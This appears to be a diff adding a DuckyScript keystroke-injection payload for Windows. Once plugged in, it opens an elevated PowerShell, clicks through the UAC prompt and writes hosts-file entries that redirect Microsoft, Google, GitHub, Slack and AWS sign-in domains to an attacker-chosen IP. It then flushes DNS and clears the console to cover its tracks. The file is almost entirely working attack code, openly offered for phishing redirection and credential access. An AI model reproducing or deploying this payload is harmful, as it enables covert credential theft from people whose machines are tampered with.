@@ -1,0 +1,55 @@
+REM ==========================================
+REM Title: Local DNS Poisoning
+REM Author: NullSec Suite
+REM Target: Windows 10/11
+REM Description: Modifies the Windows hosts
+REM   file to redirect target domains to an
+REM   attacker-controlled IP address for local
+REM   DNS poisoning / phishing redirection.
+REM Category: Credential Access / Redirection
+REM ==========================================
+DELAY 1000
+GUI r
+DELAY 500
+REM Open elevated PowerShell
+STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass'"
+ENTER
+DELAY 2000
+REM Accept UAC
+ALT y
+DELAY 1500
+REM Flush DNS cache first
+STRING ipconfig /flushdns
+ENTER
+DELAY 500
+REM Backup original hosts file
+STRING Copy-Item C:\Windows\System32\drivers\etc\hosts C:\Windows\System32\drivers\etc\hosts.bak -Force
+ENTER
+DELAY 400
+REM Add poisoned entries to hosts file
+REM Replace ATTACKER_IP with the desired redirect IP
+STRING $ip = '10.0.0.1'
+ENTER
+DELAY 350
+STRING $targets = @('login.microsoftonline.com','accounts.google.com','github.com','slack.com','mail.google.com','outlook.office365.com','login.live.com','aws.amazon.com','console.cloud.google.com')
+ENTER
+DELAY 350
+STRING $hostsPath = 'C:\Windows\System32\drivers\etc\hosts'
+ENTER
+DELAY 350
+STRING foreach ($t in $targets) { Add-Content -Path $hostsPath -Value "$ip`t$t" -Force }
+ENTER
+DELAY 500
+REM Flush DNS again to apply changes
+STRING ipconfig /flushdns
+ENTER
+DELAY 500
+REM Disable DNS Client cache service to prevent stale lookups
+STRING Stop-Service -Name Dnscache -Force 2>$null; Start-Service -Name Dnscache
+ENTER
+DELAY 400
+REM Clean up console
+STRING Clear-Host; exit
+ENTER
+DELAY 300
+ALT F4
